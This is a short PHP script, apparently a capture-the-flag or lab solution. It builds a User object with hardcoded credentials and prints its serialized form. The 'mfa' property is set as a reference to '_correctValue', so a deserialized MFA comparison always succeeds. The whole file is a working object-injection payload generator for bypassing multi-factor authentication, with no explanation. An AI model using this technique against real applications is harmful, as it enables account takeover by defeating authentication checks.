<?php

class User {
	public $username;
	public $password;
	public $_correctValue;
	public $mfa;
}

$user = new User();
$user -> username = "D0loresH4ze";
$user -> password = "rasmuslerdorf";
$user-> mfa = &$user -> _correctValue;
echo serialize($user)

?>